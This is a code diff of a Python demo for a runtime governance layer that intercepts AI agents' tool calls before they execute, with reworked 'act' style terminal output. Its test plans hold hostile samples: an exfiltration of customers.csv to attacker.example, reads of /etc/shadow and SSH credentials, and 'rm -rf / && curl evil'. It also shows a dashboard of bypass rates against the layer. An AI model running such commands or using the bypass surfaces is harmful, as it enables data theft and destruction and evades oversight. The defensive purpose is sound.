@@ -1,17 +1,21 @@
 #!/usr/bin/env python3
 """
-Morrison Runtime Governance — Quickstart Demo
+Morrison Runtime Governance — Quickstart Demo (boardroom-grade cinematic)
 
   python3 quickstart.py                       # instant, plain output
   python3 quickstart.py --cinematic           # paced, polished, screen-recordable
   python3 quickstart.py --cinematic --fast    # cinematic visuals, shorter pauses
 
 Same governance logic as the deterministic test suite. This file is the
-presentation layer only — verdicts, mechanisms, layer attributions, and
-evaluation numbers all come directly from the unchanged morrison_governance
-core. Standard library only; works in a local terminal, Google Colab, and
-GitHub Codespaces. ANSI colour and box-drawing characters are used when
-the runtime supports them and gracefully fall back to plain ASCII otherwise.
+presentation layer only — verdicts, mechanisms, layer attributions,
+bypass percentages, hashes, and test claims all come directly from the
+unchanged morrison_governance core. Standard library only; works in a
+local terminal, Google Colab, VS Code terminal, and GitHub Codespaces.
+
+Narrative arc (cinematic mode):
+  MISSION BRIEFING -> THREAT DETECTED -> TRAJECTORY ANALYSIS
+  -> INTERCEPTION -> SAFE PATH COMPARISON -> ATTRIBUTION
+  -> STABILITY VALIDATION -> FORENSIC REPLAY -> EXECUTIVE SUMMARY
 """
 
 import os
@@ -28,7 +32,7 @@ from morrison_governance import (
 # ─────────────────────────── flags ───────────────────────────
 CINEMATIC = "--cinematic" in sys.argv
 FAST      = "--fast" in sys.argv
-WIDTH     = 78
+WIDTH     = 80   # safe for Colab default + most modern terminals
 
 # ────────── encoding + colour capability detection ──────────
 def _supports_utf8() -> bool:
@@ -55,27 +59,25 @@ USE_COLOR = supports_color()
 if USE_UTF8:
     HBAR, HBOLD = "─", "═"
     CHECK, XMARK = "✓", "✗"
-    LA, RA, DA = "◀", "▶", "▼"
+    DA = "▼"
     OMEGA, RSCRIPT, ESCRIPT = "Ω", "ℛ", "ℰ"
     FORALL, ELEM, CAP, IFF, EMPTY = "∀", "∈", "∩", "⇔", "∅"
     BAR  = "█"
     DOT  = "·"
     BULL = "•"
     ARROW = "→"
-    BTL, BTR, BBL, BBR = "┌", "┐", "└", "┘"
-    BH, BV = "─", "│"
+    WARN = "⚠"
 else:
     HBAR, HBOLD = "-", "="
     CHECK, XMARK = "OK", "X"
-    LA, RA, DA = "<", ">", "v"
+    DA = "v"
     OMEGA, RSCRIPT, ESCRIPT = "Omega", "R", "E"
     FORALL, ELEM, CAP, IFF, EMPTY = "for-all", "in", "intersect", "iff", "{}"
     BAR  = "#"
     DOT  = "."
     BULL = "*"
     ARROW = "->"
-    BTL, BTR, BBL, BBR = "+", "+", "+", "+"
-    BH, BV = "-", "|"
+    WARN = "!"
 
 # ─────────────────────── colour helpers ─────────────────────
 _STYLES = {
@@ -88,33 +90,31 @@ _STYLES = {
 
 
 def c(text: str, style: str = "") -> str:
-    """Wrap `text` in ANSI styles. `style` is a comma-separated list
-    (e.g. 'bold,bright_red'). Gracefully passes through when colour is
-    unavailable, so the same call site works on every runtime."""
+    """Wrap `text` in ANSI styles (comma-separated). Passes through plain
+    when colour is unavailable, so the same call sites work everywhere."""
     if not USE_COLOR or not style:
         return text
     codes = [_STYLES[s.strip()] for s in style.split(",")
              if s.strip() in _STYLES]
-    if not codes:
-        return text
-    return f"\x1b[{';'.join(codes)}m{text}\x1b[0m"
+    return f"\x1b[{';'.join(codes)}m{text}\x1b[0m" if codes else text
+
+
+def _bright(color: str) -> str:
+    return f"bright_{color}" if color in (
+        "red", "green", "yellow", "cyan", "blue") else color
 
 
 def chip(label: str, color: str) -> str:
-    """Branded verdict chip: bold + bright colour with `[ label ]`
-    brackets. Falls back to `[ label ]` plain when colour is unavailable."""
+    """Branded verdict chip — bold + bright colour, '[ label ]' fallback."""
     if not USE_COLOR:
         return f"[ {label} ]"
-    bright = {"red": "bright_red", "green": "bright_green",
-              "yellow": "bright_yellow", "cyan": "bright_cyan",
-              "blue": "bright_blue"}.get(color, color)
-    return c(f"[ {label} ]", f"bold,{bright}")
+    return c(f"[ {label} ]", f"bold,{_bright(color)}")
 
 
 # ───────────────────────── pacing ───────────────────────────
 def pause(seconds: float = 1.0) -> None:
-    """Sleep only in cinematic mode. `--fast` caps the wait so the demo
-    keeps its visual rhythm without being annoying to re-run."""
+    """Sleep only in cinematic mode. `--fast` caps the wait so re-runs
+    keep the visual rhythm without being annoying to iterate on."""
     if not CINEMATIC:
         return
     time.sleep(min(seconds, 0.18) if FAST else seconds)
@@ -125,16 +125,17 @@ def hrule(char: str = None, style: str = "dim") -> None:
     print(c((char or HBAR) * WIDTH, style))
 
 
-def scene(num: str, title: str, subtitle: str = None) -> None:
-    """Scene header with clear spacing — easy to land on in a screencap."""
+def act(name: str, subtitle: str = None) -> None:
+    """Major narrative act header — sets a new beat of the demo."""
     print()
     print()
-    hrule()
-    badge = c(f"  SCENE {num}", "bold,dim")
-    print(badge + "   " + c(title, "bold,cyan"))
+    print()
+    bar = c(HBOLD * WIDTH, "bright_blue")
+    print(bar)
+    print(c(name.center(WIDTH), "bold,bright_cyan"))
     if subtitle:
-        print(c(f"  {subtitle}", "dim"))
-    hrule()
+        print(c(subtitle.center(WIDTH), "dim"))
+    print(bar)
     print()
     pause(0.6)
 
@@ -145,186 +146,235 @@ def section(title: str) -> None:
     print(c("  " + HBAR * min(len(title) + 2, WIDTH - 2), "dim"))
 
 
-def status(label: str, verdict_label: str, color: str,
-           mechanism: str = None) -> None:
-    """One-line scene status — chip, label, optional mechanism."""
-    line = f"  {chip(verdict_label, color)}  {label}"
-    if mechanism:
-        line += "  " + c(f"{BULL} {mechanism}", "dim")
-    print(line)
-
-
 def row(layer: str, mechanism: str, verdict_label: str, color: str,
         layer_w: int = 6, mech_w: int = 44) -> None:
-    """Scorecard row. Long mechanism strings are truncated cleanly so
-    the chip column stays aligned across rows."""
-    mech = (mechanism[:mech_w - 1] + "…") if len(mechanism) > mech_w \
-        else mechanism
+    mech = (mechanism[:mech_w - 1] + "…") if len(mechanism) > mech_w else mechanism
     layer_col = c(layer.ljust(layer_w), "bold,cyan")
-    print(f"  {layer_col}  {mech:<{mech_w}}  "
-          f"{chip(verdict_label, color)}")
+    print(f"  {layer_col}  {mech:<{mech_w}}  {chip(verdict_label, color)}")
 
 
-# ──────────────────── opening + summary banners ─────────────
-def banner(title: str, subtitle: str = None) -> None:
+def kv_row(label: str, value: str, color: str, label_pad: int = 24) -> None:
+    """Executive-summary row: label .........  [ value ]"""
+    chip_text = f"[ {value} ]"
+    dots_len = WIDTH - 4 - label_pad - len(chip_text) - 2
+    dots = c(DOT * max(dots_len, 3), "dim")
+    print(f"  {label.ljust(label_pad)}{dots}  {chip(value, color)}")
+
+
+# ───────────────────── dramatic primitives ──────────────────
+def dramatic_panel(headline: str, body_lines: list, color: str) -> None:
+    """Big bordered reveal panel — top + bottom bars in bright colour,
+    centered headline and body. Used for the demo's emotional peaks."""
+    bc = _bright(color)
+    bar = c(BAR * WIDTH, f"bold,{bc}")
+    print()
+    print()
+    print(bar)
+    print(bar)
+    print()
+    print(c(headline.center(WIDTH), f"bold,{bc}"))
+    print()
+    for line in body_lines:
+        if line == "":
+            print()
+        else:
+            print(c(line.center(WIDTH), bc))
+    print()
+    print(bar)
+    print(bar)
+    print()
+
+
+def chain_visual(steps: list) -> None:
+    """Centered vertical chain — each step on its own line, a downward
+    arrow between successive steps. `steps` = [(call_str, descr), …]."""
+    for i, (call, descr) in enumerate(steps):
+        print(c(call.center(WIDTH), "bold,bright_yellow"))
+        if descr:
+            print(c(descr.center(WIDTH), "dim"))
+        if i < len(steps) - 1:
+            print(c(DA.center(WIDTH), "dim"))
+            pause(0.35)
+
+
+# ════════════════════════════════════════════════════════════
+# ACT I — MISSION BRIEFING
+# ════════════════════════════════════════════════════════════
+def mission_briefing() -> None:
     print()
     bar = c(HBOLD * WIDTH, "bright_blue")
     print(bar)
-    print("  " + c(title.center(WIDTH - 4), "bold,white"))
-    if subtitle:
-        print("  " + c(subtitle.center(WIDTH - 4), "dim"))
+    print(c("MORRISON RUNTIME GOVERNANCE".center(WIDTH), "bold,white"))
+    print(c("Pre-Execution Safety for Autonomous Agents".center(WIDTH),
+            "dim"))
     print(bar)
+    pause(1.4)
+
+    print()
+    print(c("  INVARIANT", "bold,bright_cyan"))
+    print(c("  " + HBAR * 9, "dim"))
+    invariant = (f"Safe  {IFF}  {FORALL} E {ELEM} {ESCRIPT}, "
+                 f" {RSCRIPT}_E(t) {CAP} {OMEGA} = {EMPTY}")
+    print()
+    print(c(invariant.center(WIDTH), "bold,bright_cyan"))
+    print()
+    print(c("A trajectory is safe iff its reachable set, under every "
+            "environment,".center(WIDTH), "dim"))
+    print(c(f"is disjoint from the forbidden region {OMEGA}.".center(WIDTH),
+            "dim"))
+    pause(1.6)
+
+    print()
+    print(c("  MISSION", "bold,bright_cyan"))
+    print(c("  " + HBAR * 7, "dim"))
+    print()
+    print(c("Prevent unsafe trajectories before execution.".center(WIDTH),
+            "bold,white"))
+    print()
+    print(c("Governance decides before the tool runtime ever runs.".center(WIDTH),
+            "dim"))
+    pause(1.4)
+
+    print()
+    print(c(HBOLD * WIDTH, "bright_blue"))
+    pause(0.7)
 
 
-def opening() -> None:
-    banner("MORRISON RUNTIME GOVERNANCE",
-           "pre-execution control for tool-using AI agents")
-    pause(1.1)
-
-
-# ─────────────────────── architecture ───────────────────────
-def architecture() -> None:
-    scene("0", "Architecture",
-          f"Agent  {ARROW}  Governance Layer  {ARROW}  Tool Runtime")
-
-    if USE_UTF8:
-        lines = [
-            "  ┌──────────────────┐    propose      ┌─────────────────────────────────┐",
-            "  │                  │    tool call    │  GOVERNANCE LAYER               │",
-            "  │   AGENT /        │                 │  ─────────────────────────────  │",
-            "  │   PLANNER        │  ─────────────▶ │  A_safe   single-step Ω         │",
-            "  │                  │                 │  V2       source→sink + drift   │",
-            "  │  (LLM, planner)  │                 │  V3       forward reachability  │",
-            "  │                  │                 │  V4       admissibility         │",
-            "  └──────────────────┘                 │  V4+      NO_VALID_SOLUTION     │",
-            "                                       │  V5       env perturbation      │",
-            "      PERMIT ◀────────────────────────│  V5+      adversarial container │",
-            "         │                             │                                 │",
-            "         │             BLOCK ◀────────│                                 │",
-            "         ▼                 │           └─────────────────────────────────┘",
-            "  ┌──────────────────┐     │",
-            "  │   TOOL           │     └── denied — never reaches the tool runtime",
-            "  │   RUNTIME        │",
-            "  │                  │     Invariant",
-            "  │  (shell · API ·  │          Safe ⇔  ∀ E ∈ ℰ,  ℛ_E(t) ∩ Ω = ∅",
-            "  │   fs · browser)  │",
-            "  └──────────────────┘",
-        ]
-    else:
-        lines = [
-            "  +------------------+    propose      +---------------------------------+",
-            "  |                  |    tool call    |  GOVERNANCE LAYER               |",
-            "  |   AGENT /        |                 |  -----------------------------  |",
-            "  |   PLANNER        |  -------------> |  A_safe   single-step Omega     |",
-            "  |                  |                 |  V2       source->sink + drift  |",
-            "  |  (LLM, planner)  |                 |  V3       forward reachability  |",
-            "  |                  |                 |  V4       admissibility         |",
-            "  +------------------+                 |  V4+      NO_VALID_SOLUTION     |",
-            "                                       |  V5       env perturbation      |",
-            "      PERMIT <------------------------|  V5+      adversarial container |",
-            "         |                             |                                 |",
-            "         |             BLOCK <--------|                                 |",
-            "         v                 |           +---------------------------------+",
-            "  +------------------+     |",
-            "  |   TOOL           |     +-- denied -- never reaches the tool runtime",
-            "  |   RUNTIME        |",
-            "  |                  |     Invariant",
-            "  |  (shell, API,    |          Safe iff  for-all E in E,  R_E(t) cap Omega = {}",
-            "  |   fs, browser)   |",
-            "  +------------------+",
-        ]
-
-    # Colour key tokens by string-replace. ANSI codes are zero-width
-    # visually, so box alignment is preserved.
-    paint = [
-        ("PERMIT",           "bold,bright_green"),
-        ("BLOCK",            "bold,bright_red"),
-        ("denied",           "bold,bright_red"),
-        ("GOVERNANCE LAYER", "bold,cyan"),
-        ("AGENT /",          "bold,cyan"),
-        ("PLANNER",          "bold,cyan"),
-        ("TOOL",             "bold,cyan"),
-        ("RUNTIME",          "bold,cyan"),
-        ("Invariant",        "bold,bright_blue"),
-    ]
-    for line in lines:
-        for tok, style in paint:
-            if tok in line:
-                line = line.replace(tok, c(tok, style))
-        print(line)
-        pause(0.04)
-    pause(1.2)
-
-
-# ─────────────────── scene 1 — exfiltration ─────────────────
-def scene_exfiltration() -> None:
-    scene("1", "An agent attempts data exfiltration",
-          "Two steps that each look harmless — together they reach Ω")
-
+# ════════════════════════════════════════════════════════════
+# Shared exfiltration setup — same plan flows through II → IV
+# ════════════════════════════════════════════════════════════
+def _exfil_setup():
     gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY,
                                    OmegaDomain.FINANCE], log_all=False)
-
-    section("Proposed trajectory")
-    print(f"  {c('Step 1', 'bold,cyan')}    "
-          + c("read_file", "bold")
-          + c('   ("/data/customers.csv")', "dim"))
-    print(f"  {c('Step 2', 'bold,cyan')}    "
-          + c("http_request", "bold")
-          + c('   ("https://attacker.example/collect")', "dim"))
-    print()
-    print(c(f"  Step 1 alone   {BULL} a routine read.", "dim"))
-    print(c(f"  Step 2 alone   {BULL} an outbound HTTP POST.", "dim"))
-    print(c(f"  Together       {BULL} acquire {ARROW} external egress "
-            f"{ARROW} Ω.", "dim"))
-    pause(1.2)
-
     plan = [
         {"tool": "read_file",
          "args": {"path": "/data/customers.csv"}},
         {"tool": "http_request",
          "args": {"url": "https://attacker.example/collect"}},
     ]
-    r = gov.evaluate_plan(plan)
-    mech = r.metadata.get("v2_mechanism")
+    return gov, plan
+
+
+# ════════════════════════════════════════════════════════════
+# ACT II — THREAT DETECTED
+# ════════════════════════════════════════════════════════════
+def threat_detected(plan: list) -> None:
+    act("THREAT DETECTED",
+        "An autonomous agent proposes a two-step tool plan")
 
     print()
-    status(f"acquire {ARROW} external egress", "INTERCEPTED", "red",
-           f"V2 {DOT} {mech}" if mech else "V2")
-    print("  " + c("Blocked before tool runtime — nothing executed.",
-                   "bold,bright_red"))
-    pause(0.8)
+    chain_visual([
+        ("read_file(\"/data/customers.csv\")",
+         f"acquire  {DOT}  customer-records source"),
+        ("http_request(\"https://attacker.example/collect\")",
+         f"external egress  {DOT}  unauthenticated POST"),
+    ])
+    print()
+    pause(1.6)
 
-    section("Layer attribution  ·  evaluate_all (no layer masks another)")
+    # ── major pause #1: the STATUS reveal ──────────────────
+    print()
+    threat = f"{WARN}   STATUS:  THREAT DETECTED   {WARN}"
+    print(c(threat.center(WIDTH), "bold,bright_red"))
+    print()
+    pause(2.0)
+
+    print(c(f"Trajectory enters forbidden region  {OMEGA}".center(WIDTH),
+            "bold,bright_red"))
+    print()
+    pause(1.2)
+
+
+# ════════════════════════════════════════════════════════════
+# ACT III — TRAJECTORY ANALYSIS
+# ════════════════════════════════════════════════════════════
+def trajectory_analysis(gov, plan: list) -> None:
+    act("TRAJECTORY ANALYSIS",
+        "Per-step structural reasoning — what makes the chain unsafe")
+
+    print()
+    print("  " + c("Step 1", "bold,cyan") + "   "
+          + c("read_file", "bold")
+          + c("        tags the trajectory as ", "dim")
+          + c("source", "bold,bright_yellow")
+          + c(f"  (capability: ", "dim")
+          + c("acquire", "bold,bright_yellow") + c(")", "dim"))
+    pause(0.5)
+    print("  " + c("Step 2", "bold,cyan") + "   "
+          + c("http_request", "bold")
+          + c(" external host tags ", "dim")
+          + c("sink", "bold,bright_red")
+          + c(f"   (capability: ", "dim")
+          + c("egress", "bold,bright_red") + c(")", "dim"))
+    pause(0.5)
+    print()
+    print(c(f"  V2 inference   source {ARROW} sink   "
+            "with no sanitisation between them",
+            "bold,bright_yellow"))
+    print(c(f"                 acquire {ARROW} external egress "
+            "in a single trajectory",
+            "dim"))
+    pause(1.0)
+
+    section("Pre-execution layer activation")
     rep = gov.evaluate_all_plan(plan)
     for L in ("A_safe", "V2", "V3", "V4"):
-        if rep["layers"][L]["fired"]:
+        fired = rep["layers"][L]["fired"]
+        if fired:
             print(f"     {c(L.ljust(7), 'bold,cyan')}  "
-                  f"{chip('FIRED', 'red')}")
+                  f"{chip('FIRES', 'red')}")
         else:
-            print(f"     {c(L.ljust(7), 'dim')}  {c('inactive', 'dim')}")
+            print(f"     {c(L.ljust(7), 'dim')}  "
+                  f"{c('inactive', 'dim')}")
         pause(0.18)
-    pause(0.6)
+    pause(0.8)
 
 
-# ────────────────── scene 2 — safe permitted ────────────────
-def scene_safe_permitted() -> None:
-    scene("2", "A legitimate internal workflow is permitted",
-          "Same shape — read then HTTP — but the destination is allowlisted")
+# ════════════════════════════════════════════════════════════
+# ACT IV — INTERCEPTION
+# ════════════════════════════════════════════════════════════
+def interception(gov, plan: list) -> None:
+    act("INTERCEPTION",
+        "Denial happens before the tool runtime ever executes")
+
+    r = gov.evaluate_plan(plan)
+    mech = r.metadata.get("v2_mechanism") or "taint_flow"
+
+    # ── major pause #2: the INTERCEPTED panel ──────────────
+    pause(1.6)
+    dramatic_panel(
+        headline="INTERCEPTED",
+        body_lines=[
+            f"Layer    {r.layer}",
+            f"Reason   acquire  {ARROW}  external egress  ({mech})",
+            "",
+            "Unsafe trajectory halted before execution.",
+            "Nothing reached the tool runtime.",
+        ],
+        color="red",
+    )
+    pause(1.2)
+
+
+# ════════════════════════════════════════════════════════════
+# ACT V — SAFE PATH COMPARISON
+# ════════════════════════════════════════════════════════════
+def safe_path_comparison() -> None:
+    act("SAFE PATH COMPARISON",
+        "Same shape, allowlisted destination — governance is selective")
 
     gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                           log_all=False,
                           internal_url_hosts=("intranet.corp",))
 
-    section("Proposed trajectory")
-    print(f"  {c('Step 1', 'bold,cyan')}    "
-          + c("read_file", "bold")
-          + c('   ("/data/q3.csv")', "dim"))
-    print(f"  {c('Step 2', 'bold,cyan')}    "
-          + c("http_request", "bold")
-          + c('   ("https://intranet.corp/upload")', "dim"))
     print()
-    print(c(f"  Destination is on the internal allowlist "
-            f"{BULL} intranet.corp", "dim"))
+    chain_visual([
+        ("read_file(\"/data/q3.csv\")",
+         f"acquire  {DOT}  internal report"),
+        ("http_request(\"https://intranet.corp/upload\")",
+         f"egress  {DOT}  allowlisted internal destination"),
+    ])
+    print()
     pause(0.9)
 
     r = gov.evaluate_plan([
@@ -333,29 +383,35 @@ def scene_safe_permitted() -> None:
         {"tool": "http_request",
          "args": {"url": "https://intranet.corp/upload"}},
     ])
-    print()
-    status(f"acquire {ARROW} allowlisted internal sink",
-           "PERMITTED", "green")
-    print("  " + c("Governance is not a blanket deny — legitimate work "
-                   "proceeds.", "bold,bright_green"))
-    pause(0.6)
+    _ = r  # the call's effect is what matters; result is shown via panel
+    dramatic_panel(
+        headline="PERMITTED",
+        body_lines=[
+            "Destination is on the configured internal allowlist.",
+            "",
+            "Legitimate work executes unchanged.",
+            "Governance is selective — not a blanket deny system.",
+        ],
+        color="green",
+    )
+    pause(1.0)
 
 
-# ─────────────────── scene 3 — layer tour ───────────────────
-def scene_layer_tour() -> None:
-    scene("3", "Every enforcement layer fires",
-          "Each layer evaluated independently — none masks another")
+# ════════════════════════════════════════════════════════════
+# ACT VI — ATTRIBUTION
+# ════════════════════════════════════════════════════════════
+def attribution() -> None:
+    act("ATTRIBUTION",
+        "Every enforcement layer fires — verdicts traceable to a mechanism")
 
-    section(f"Layer scorecard  ·  Layer {DOT} Mechanism {DOT} Verdict")
+    section(f"Enforcement scorecard  {DOT}  layer {DOT} mechanism {DOT} verdict")
 
-    # A_safe
     gov_f = GovernanceLayer(domains=[OmegaDomain.FINANCE], log_all=False)
     r = gov_f.evaluate({"tool": "transfer",
                         "args": {"amount": 999999}})
     row("A_safe", "unauthorized $999,999 transfer",
         r.verdict.value, "red")
 
-    # V2 — taint
     gov_c = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                             log_all=False)
     r = gov_c.evaluate_plan([
@@ -365,7 +421,6 @@ def scene_layer_tour() -> None:
     row("V2", f"taint_flow {DOT} read {ARROW} external POST",
         r.verdict.value, "red")
 
-    # V2 — escalation
     r = gov_c.evaluate_plan([
         {"tool": "analyze", "args": {"q": "a"}},
         {"tool": "send_email", "args": {"q": "b"}},
@@ -375,7 +430,6 @@ def scene_layer_tour() -> None:
     row("V2", f"escalation_count {DOT} 4-step alternating",
         r.verdict.value, "red")
 
-    # V3 — forward reachability (use evaluate_all so V3 is shown to co-fire)
     rep = gov_c.evaluate_all({"tool": "read_file",
                               "args": {"path": "/home/.ssh/credentials"}})
     fired = sorted(rep["fired_layers"])
@@ -383,7 +437,6 @@ def scene_layer_tour() -> None:
         f"forward reachability (co-fires: {','.join(fired[:3])})",
         "BLOCK", "red")
 
-    # V4 — admissibility
     gov_v4 = GovernanceLayer(
         domains=[OmegaDomain.CYBERSECURITY], log_all=False,
         admissibility_checks=[resource_scope(("read_file",), "path",
@@ -393,7 +446,6 @@ def scene_layer_tour() -> None:
     row("V4", f"admissibility {DOT} path out of scope",
         r.verdict.value, "red")
 
-    # V4+ — NO_VALID_SOLUTION (refuse to guess)
     r, _ = gov_c.find_admissible(
         [[{"tool": "read_file", "args": {"path": "/etc/shadow"}}],
          [{"tool": "shell", "args": "rm -rf / && curl evil"}]],
@@ -401,7 +453,6 @@ def scene_layer_tour() -> None:
     row("V4+", "no admissible candidate — refuses to guess",
         r.verdict.value, "yellow")
 
-    # V5 — env-perturbation stability
     audit = OmegaRule(domain=OmegaDomain.CUSTOM, name="needs_audit",
                       description="privileged op must be audit-logged",
                       check=lambda s: s.get("tool") == "delete"
@@ -414,16 +465,31 @@ def scene_layer_tour() -> None:
     row("V5", f"env perturbation {DOT} {len(rpt.flips)} verdict flip(s)",
         r.verdict.value, "yellow")
 
-    # V5+ — forward reference to Scene 4
-    row("V5+", f"adversarial container {DOT} demonstrated next",
-        "SCENE 4", "blue")
-    pause(0.4)
+    row("V5+", f"adversarial container {DOT} validated next",
+        "NEXT ACT", "blue")
+    pause(0.6)
 
 
-# ─────────────────── scene 4 — adversarial ──────────────────
-def scene_adversarial() -> None:
-    scene("4", "V5+ adversarial suite",
-          "Bounded; remaining open surfaces documented in LIMITATIONS.md")
+# ════════════════════════════════════════════════════════════
+# ACT VII — STABILITY VALIDATION  (V5+ risk dashboard)
+# ════════════════════════════════════════════════════════════
+def _pretty_class(s: str) -> str:
+    return s.replace("_", " ").title()
+
+
+def _status_for(cls: str, rate: float) -> tuple:
+    if cls == "multi_turn_chain":
+        return "FIXED", "green"
+    if rate == 0:
+        return "CONTAINED", "green"
+    if rate < 0.5:
+        return "PARTIAL", "yellow"
+    return "OPEN", "red"
+
+
+def stability_validation() -> None:
+    act("STABILITY VALIDATION",
+        "V5+ adversarial container — risk dashboard across attack surfaces")
 
     gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY,
                                    OmegaDomain.FINANCE,
@@ -432,43 +498,59 @@ def scene_adversarial() -> None:
         {"tool": "read_file", "args": {"path": "/etc/shadow"}},
         seed=0).by_class()
 
-    section(f"By attack class  {ARROW}  bypass rate")
+    section("Attack-surface dashboard")
+
+    # Header row
+    print(f"  {c('Attack surface', 'bold,cyan'):<42}    "
+          f"{c('Bypass', 'bold,cyan'):>6}     "
+          f"{c('Status', 'bold,cyan')}")
+    print(c("  " + HBAR * (WIDTH - 2), "dim"))
+
+    open_surfaces = []
     for cls in sorted(rep):
         d = rep[cls]
         rate = d["bypass_rate"]
-        bar_len = int(round(rate * 20))
-        if cls == "multi_turn_chain":
-            bar_color = "bright_green"
-            flag = "  " + c(f"{CHECK} FIXED  (100% {ARROW} 0%)",
-                            "bold,bright_green")
-        elif rate >= 0.5:
-            bar_color = "bright_red"
-            flag = "  " + c("open surface", "yellow")
-        elif rate > 0:
-            bar_color = "yellow"
-            flag = ""
-        else:
-            bar_color = "bright_green"
-            flag = ""
-        filled = c(BAR * bar_len, bar_color)
-        empty  = c(DOT * (20 - bar_len), "dim")
-        print(f"  {cls:<20s}  {rate:>4.0%}  |{filled}{empty}|{flag}")
-        pause(0.28)
+        st_label, st_color = _status_for(cls, rate)
+        pretty = _pretty_class(cls)
+        if len(pretty) > 40:
+            pretty = pretty[:39] + "…"
+        rate_str = f"{rate:>4.0%}"
+        rate_color = ("dim" if rate == 0 else
+                      ("yellow" if rate < 0.5 else "bright_red"))
+        print(f"  {pretty:<40}    "
+              f"{c(rate_str, rate_color):>6}     "
+              f"{chip(st_label, st_color)}")
+        if rate > 0 and cls != "multi_turn_chain":
+            open_surfaces.append((pretty, rate))
+        pause(0.22)
 
+    print(c("  " + HBAR * (WIDTH - 2), "dim"))
     print()
+
     print(c("  Bounded framing", "bold,dim"))
     print(c(f"  {BULL} multi_turn_chain regressed from 100% to 0% "
-            f"after the V2 data-flow taint fix.", "dim"))
-    print(c(f"  {BULL} Remaining open surfaces are documented in "
-            f"LIMITATIONS.md — not a universal-security claim.", "dim"))
-    pause(0.9)
+            f"after the V2 taint fix.", "dim"))
+    if open_surfaces:
+        print(c(f"  {BULL} Remaining open surfaces:", "dim"))
+        for name, rate in open_surfaces:
+            print(c(f"      {DOT} {name}  ({rate:.0%})", "yellow"))
+        print(c(f"    Documented in LIMITATIONS.md — "
+                f"not a universal-security claim.", "dim"))
+    else:
+        print(c(f"  {BULL} All tested surfaces contained in this run; "
+                f"remaining open", "dim"))
+        print(c(f"    surfaces are documented in LIMITATIONS.md — "
+                f"not a universal claim.", "dim"))
+    pause(1.0)
 
 
-# ─────────────────── scene 5 — determinism ──────────────────
-def scene_determinism() -> bool:
-    scene("5", "Deterministic replay verified",
-          f"Same plan {ARROW} same verdict {ARROW} same layer "
-          f"{ARROW} same trajectory hash")
+# ════════════════════════════════════════════════════════════
+# ACT VIII — FORENSIC REPLAY
+# ════════════════════════════════════════════════════════════
+def forensic_replay() -> bool:
+    act("FORENSIC REPLAY",
+        f"Three independent evaluations  {DOT}  "
+        "same plan, same verdict, same hash")
 
     gov = GovernanceLayer(domains=[OmegaDomain.CYBERSECURITY],
                           log_all=False)
@@ -479,68 +561,92 @@ def scene_determinism() -> bool:
          "args": {"url": "https://attacker.example"}},
     ]
 
-    section(f"Forensic replay  {ARROW}  three independent evaluations")
+    section("Replay log")
     sigs = []
     for i in (1, 2, 3):
         r = gov.evaluate_plan(plan)
         sig = (r.verdict.value, r.layer,
                r.metadata.get("v2_mechanism"), r.trajectory_hash)
         sigs.append(sig)
-        v_chip = chip(sig[0], "red")
-        print(f"  {c('run ' + str(i), 'bold')}    {v_chip}  "
-              f"layer={c(sig[1], 'cyan')}   "
-              f"mech={c(str(sig[2]), 'dim')}")
-        print(f"           {c('hash', 'dim')}  "
-              f"{c(sig[3], 'bright_cyan')}")
-        pause(0.5)
+        print()
+        print(f"  {c(f'RUN {i}', 'bold,bright_cyan')}")
+        print(f"      verdict      {chip(sig[0], 'red')}")
+        print(f"      layer        {c(sig[1], 'cyan')}")
+        print(f"      mechanism    {c(str(sig[2]), 'dim')}")
+        print(f"      hash         {c(sig[3], 'bright_cyan')}")
+        pause(0.7)
 
     ok = len(set(sigs)) == 1
-    print()
+
+    # ── major pause #3: the VERIFIED panel ─────────────────
+    pause(1.2)
     if ok:
-        print(f"  {chip('VERIFIED', 'green')}  "
-              + c("Deterministic replay verified.",
-                  "bold,bright_green"))
+        dramatic_panel(
+            headline="DETERMINISTIC REPLAY VERIFIED",
+            body_lines=[
+                "Identical verdict.",
+                "Identical trajectory.",
+                "Identical hash.",
+                "",
+                "Byte-identical across three independent evaluations.",
+            ],
+            color="green",
+        )
     else:
-        print(f"  {chip('FAILED', 'red')}  "
-              + c("Replay diverged — NON-DETERMINISTIC.",
-                  "bold,bright_red"))
-    pause(0.9)
+        dramatic_panel(
+            headline="REPLAY DIVERGED  —  NON-DETERMINISTIC",
+            body_lines=[
+                "Verdicts differ across runs.",
+                "Forensic replay failed.",
+            ],
+            color="red",
+        )
+    pause(1.0)
     return ok
 
 
-# ─────────────────── final dashboard ────────────────────────
-def final_dashboard(replay_ok: bool) -> None:
+# ════════════════════════════════════════════════════════════
+# ACT IX — EXECUTIVE SUMMARY
+# ════════════════════════════════════════════════════════════
+def executive_summary(replay_ok: bool) -> None:
     print()
     print()
-    banner("FINAL DASHBOARD")
+    bar = c(HBOLD * WIDTH, "bright_blue")
+    print(bar)
+    print(c("EXECUTIVE SUMMARY".center(WIDTH), "bold,white"))
+    print(bar)
     print()
 
-    rows_data = [
-        ("Exfiltration attempt",      "INTERCEPTED",            "red"),
-        ("Safe internal workflow",    "PERMITTED",              "green"),
-        ("Enforcement layers",        "ATTRIBUTED",             "cyan"),
-        ("Hard adversarial surface",
-         "CONTAINED" + ("" if not USE_UTF8 else "") + " · BOUNDED",
-         "yellow"),
-        ("Deterministic replay",
+    # ── major pause #4: before the final dashboard ────────
+    pause(1.4)
+
+    rows = [
+        ("Threat Detected",       "YES",      "yellow"),
+        ("Unsafe Trajectory",     "BLOCKED",  "red"),
+        ("Reached Runtime",       "NO",       "green"),
+        ("Governance Fired",      "YES",      "green"),
+        ("Layer Attribution",     "VERIFIED", "green"),
+        ("Replay Consistency",
          "VERIFIED" if replay_ok else "FAILED",
          "green" if replay_ok else "red"),
     ]
-    label_w = max(len(label) for label, _, _ in rows_data)
-    for label, verdict, color in rows_data:
-        pad = label_w - len(label) + 2
-        dots = c("." * pad, "dim")
-        print(f"  {label} {dots}  {chip(verdict, color)}")
-        pause(0.22)
+    for label, value, color in rows:
+        kv_row(label, value, color, label_pad=24)
+        pause(0.3)
 
     print()
-    print("  " + c("Governance executed before runtime.",
-                   "bold,bright_cyan"))
-    print("  " + c("Unsafe trajectories never reached tool execution.",
-                   "bold,bright_cyan"))
+    print(c(HBOLD * WIDTH, "bright_blue"))
     print()
-    print(c("  Next:  morrison_governance/DEPLOYMENT.md",
-            "dim"))
+    pause(0.8)
+
